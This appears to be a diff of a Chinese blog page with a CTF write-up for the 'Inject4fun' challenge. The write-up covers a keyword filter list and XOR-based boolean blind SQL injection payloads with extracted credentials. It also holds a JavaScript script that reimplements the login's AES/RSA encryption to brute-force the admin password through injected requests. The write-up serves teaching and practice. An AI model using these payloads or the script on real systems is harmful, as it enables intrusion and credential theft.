@@ -1,32 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-    
-
-    
-
-    
-
-
-
+    <!-- so meta -->
     <meta charset="utf-8">
-    
-    
-    
-    
-    <title>数字经济云安全公测大赛Inject4fun题解  | osword&#39;s blog | 小刀</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#3F51B5">
-    
-    
-    <meta name="keywords" content="CTF">
-    <meta name="description" content="Inject4Funlogin.html                                                                                              1568977270946               js代码">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Inject4Funlogin.html  js代码  提示注入，过滤以下字符 1or、and、&amp;&amp;、||、ord、ascii、like、select、union....  可以构造如下语句,注入类型布尔盲注 12341&#39;^(length(database())&#x3D;4)^&#39;1   长度3false &#x3D;&gt; 显示：wrong password  true&#x3D;&gt; 显示：wrong">
 <meta property="og:type" content="article">
 <meta property="og:title" content="数字经济云安全公测大赛Inject4fun题解 ">
 <meta property="og:url" content="http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="Inject4Funlogin.html                                                                                              1568977270946               js代码">
+<meta property="og:description" content="Inject4Funlogin.html  js代码  提示注入，过滤以下字符 1or、and、&amp;&amp;、||、ord、ascii、like、select、union....  可以构造如下语句,注入类型布尔盲注 12341&#39;^(length(database())&#x3D;4)^&#39;1   长度3false &#x3D;&gt; 显示：wrong password  true&#x3D;&gt; 显示：wrong">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/1568977270946.png">
 <meta property="og:image" content="http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/1568977314794.png">
@@ -40,193 +25,145 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/1568977270946.png">
     
-        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
     
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
-    <script>window.lazyScripts=[]</script>
-
-    <!-- custom head -->
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
     
+    <!-- title -->
+    <title>数字经济云安全公测大赛Inject4fun题解 </title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
+    
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/avatar.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">osword</h5>
-          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
-        </hgroup>
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                主页
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                Archives
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://zhzhdoai.github.io/"  >
-                <i class="icon icon-lg icon-友链"></i>
-                友链
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-glotozz"></i>
-                Glotozz
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-sommus"></i>
-                Sommus
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-mochazz@七月火"></i>
-                Mochazz 七月火
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-tea9"></i>
-                Tea 9
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-Decade"></i>
-                Decade
-              </a>
-            </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
         
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/22/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-fafuscan/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&text=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&is_video=false&description=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=数字经济云安全公测大赛Inject4fun题解 &body=Check out this article: http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&name=数字经济云安全公测大赛Inject4fun题解 &description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&t=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">数字经济云安全公测大赛Inject4fun题解 </div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
-            </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
-        
-        
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
-        
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Inject4Fun"><span class="toc-number">1.</span> <span class="toc-text">Inject4Fun</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.1.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法二-wp"><span class="toc-number">1.2.</span> <span class="toc-text">解法二(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ewum"><span class="toc-number">3.</span> <span class="toc-text">ewum</span></a></li></ol>
     </div>
-</header>
-<header class="content-header post-header">
-
-    <div class="container fade-scale">
-        <h1 class="title">数字经济云安全公测大赛Inject4fun题解 </h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2019-09-22T02:28:30.000Z" itemprop="datePublished" class="page-time">
-  2019-09-22
-</time>
-
-
-            
-        </h5>
-    </div>
+  </span>
+</div>
 
     
-
-
-</header>
-
-
-<div class="container body-wrap">
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-    <aside class="post-widget">
-        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Inject4Fun"><span class="post-toc-number">1.</span> <span class="post-toc-text">Inject4Fun</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flag"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">flag</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解法二-wp"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">解法二(wp)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">2.</span> <span class="post-toc-text">MISC</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ewum"><span class="post-toc-number">3.</span> <span class="post-toc-text">ewum</span></a></li></ol>
-        </nav>
-    </aside>
+    <h1 class="posttitle" itemprop="name headline">
+        数字经济云安全公测大赛Inject4fun题解 
+    </h1>
 
 
-<article id="post-数字经济云安全公测大赛Inect4fun题解"
-  class="post-article article-type-post fade" itemprop="blogPost">
 
-    <div class="post-card">
-        <h1 class="post-card-title">数字经济云安全公测大赛Inject4fun题解 </h1>
-        <div class="post-meta">
-            <time class="post-time" title="2019-09-22 10:28:30" datetime="2019-09-22T02:28:30.000Z"  itemprop="datePublished">2019-09-22</time>
-
-            
-
-
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
-</span>
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">osword's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-22T02:28:30.000Z" itemprop="datePublished">2019-09-22</time>
+        
+      
+    </div>
 
 
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <h1 id="Inject4Fun"><a href="#Inject4Fun" class="headerlink" title="Inject4Fun"></a>Inject4Fun</h1><p>login.html</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1568977270946.png" alt="1568977270946" title="">
-                </div>
-                <div class="image-caption">1568977270946</div>
-            </figure>
+      
 
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Inject4Fun"><a href="#Inject4Fun" class="headerlink" title="Inject4Fun"></a>Inject4Fun</h1><p>login.html</p>
+<p><img src="./1568977270946.png" alt="1568977270946"></p>
 <p>js代码</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1568977314794.png" alt="1568977314794" title="">
-                </div>
-                <div class="image-caption">1568977314794</div>
-            </figure>
-
+<p><img src="./1568977314794.png" alt="1568977314794"></p>
 <p>提示注入，过滤以下字符</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or、and、&amp;&amp;、||、ord、ascii、like、select、union....</span><br></pre></td></tr></table></figure>
 
@@ -237,331 +174,148 @@
 <p>刚开始思路是通过python js2py执行js带到后端，但是发现这js也太多了。或者逆出加密，用py语言执行。还有就是selenium模块模拟人手动操作浏览器。但发现自己开发太菜了，脚本报错一大堆，折腾一下午，最后和学长一起手工盲注.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'^(substr(username,1,1)='</span>A<span class="string">')^'</span><span class="number">1</span>  =&gt; Admin</span><br><span class="line"><span class="number">1</span><span class="string">'^(substr(password,1,1)='</span>A<span class="string">')^'</span><span class="number">1</span>  =&gt; e6f1567e3698c06b9eb17b0e8e77444e</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1568977839299.png" alt="1568977839299" title="">
-                </div>
-                <div class="image-caption">1568977839299</div>
-            </figure>
-
-
-
-<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1568977921802.png" alt="1568977921802" title="">
-                </div>
-                <div class="image-caption">1568977921802</div>
-            </figure>
-
-
-
+<p><img src="./1568977839299.png" alt="1568977839299"></p>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><img src="./1568977921802.png" alt="1568977921802"></p>
 <h2 id="解法二-wp"><a href="#解法二-wp" class="headerlink" title="解法二(wp)"></a>解法二(wp)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomPassword</span>(<span class="params">size</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> seed = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'p'</span>,<span class="string">'Q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,</span><br><span class="line">  <span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span></span><br><span class="line">  );</span><br><span class="line">  seedlength = seed.length;</span><br><span class="line">  <span class="keyword">var</span> createPassword = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;size;i++) &#123;</span><br><span class="line">    j = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*seedlength);</span><br><span class="line">    createPassword += seed[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> createPassword;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">username, password</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = randomPassword(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">var</span> key = CryptoJS.enc.Latin1.parse(a);        </span><br><span class="line">    <span class="keyword">var</span> iv =    CryptoJS.enc.Latin1.parse(<span class="string">'1234567890123456'</span>);            </span><br><span class="line">    <span class="keyword">var</span> data1 = username;     </span><br><span class="line">    <span class="keyword">var</span> encrypted1 = CryptoJS.AES.encrypt(data1, key, &#123; <span class="attr">iv</span>: iv, <span class="attr">mode</span>: CryptoJS.mode.CBC, <span class="attr">padding</span>: CryptoJS.pad.ZeroPadding &#125;);</span><br><span class="line">    <span class="keyword">var</span> data2 = password;</span><br><span class="line">    <span class="keyword">var</span> encrypted2 = CryptoJS.AES.encrypt(data2, key, &#123; <span class="attr">iv</span>: iv, <span class="attr">mode</span>: CryptoJS.mode.CBC, <span class="attr">padding</span>: CryptoJS.pad.ZeroPadding &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">'#username'</span>).val(encrypted1);</span><br><span class="line">    $(<span class="string">'#password'</span>).val(encrypted2);</span><br><span class="line">    <span class="keyword">var</span> password = $(<span class="string">'#password'</span>).val();</span><br><span class="line">    <span class="keyword">var</span> username = $(<span class="string">'#username'</span>).val();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> rsa = <span class="keyword">new</span> RSAKey();</span><br><span class="line">    <span class="keyword">var</span> modulus = <span class="string">"CDB41B014C244A55CEC3E9D222B22C8A05A7DD7DF8A419A2A9C08E91DF725A1FD4C09777F36D394701C5DB97CCFC52FFBD5A90329295F5CEBBB89986BAAFAE4FE58A1F3ECFC39A7B960F5697632CE9D2FAA787F36D9CF5F4FE59DBB52E0554CC4B510D87AB72EB80D36A61E8B9AD00F37720578986E5F17AB0387754566F4E2B"</span>;</span><br><span class="line">    <span class="keyword">var</span> exponent = <span class="string">"010001"</span>;</span><br><span class="line">    rsa.setPublic(modulus, exponent);</span><br><span class="line">    <span class="keyword">var</span> res = rsa.encrypt(a);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [username, password, res]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// wrong password</span></span><br><span class="line"><span class="comment">// wrong user</span></span><br><span class="line"><span class="keyword">var</span> password = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">var</span> strings = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_password</span>(<span class="params">i, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i &gt; <span class="number">32</span> || j &gt; <span class="number">36</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">var</span> x =  strings[j];</span><br><span class="line">    <span class="keyword">var</span> username = <span class="string">"' ^ (substr(password,"</span> + i +<span class="string">",1)='"</span> +x+<span class="string">"') ^ '1"</span>;</span><br><span class="line">    res = encode(username, <span class="string">'admin'</span>);</span><br><span class="line">    $.ajax(&#123; </span><br><span class="line">      type:<span class="string">"post"</span>, </span><br><span class="line">      url:<span class="string">"login.php"</span>, </span><br><span class="line">      data: &#123;<span class="attr">username</span>:res[<span class="number">0</span>], <span class="attr">password</span>:res[<span class="number">1</span>], <span class="attr">code</span>:res[<span class="number">2</span>]&#125;, </span><br><span class="line">      dataType: <span class="string">'text'</span>, </span><br><span class="line">      <span class="keyword">async</span> : <span class="literal">false</span>,</span><br><span class="line">      success:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(result == <span class="string">'wrong user'</span>) &#123;</span><br><span class="line">          <span class="comment">// console.log(result);</span></span><br><span class="line">          get_password(i, ++j);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          password += x;</span><br><span class="line">          <span class="built_in">console</span>.log(password);</span><br><span class="line">          get_password(++i, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">get_password(<span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
 
 <p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247486013&amp;idx=1&amp;sn=958eefc7f96217e85b634a9a3445d869&amp;chksm=e89e22e5dfe9abf3f246a719ebca8192e94d94f64b722132eab5f3bdebf549c50a1fdfac3d77&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569114886780&amp;sharer_shareid=a4ed4d8d3b949604b1b6383586a26b41#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247486013&amp;idx=1&amp;sn=958eefc7f96217e85b634a9a3445d869&amp;chksm=e89e22e5dfe9abf3f246a719ebca8192e94d94f64b722132eab5f3bdebf549c50a1fdfac3d77&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569114886780&amp;sharer_shareid=a4ed4d8d3b949604b1b6383586a26b41#rd</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1569118726156.png" alt="1569118726156" title="">
-                </div>
-                <div class="image-caption">1569118726156</div>
-            </figure>
-
+<p><img src="./1569118726156.png" alt="1569118726156"></p>
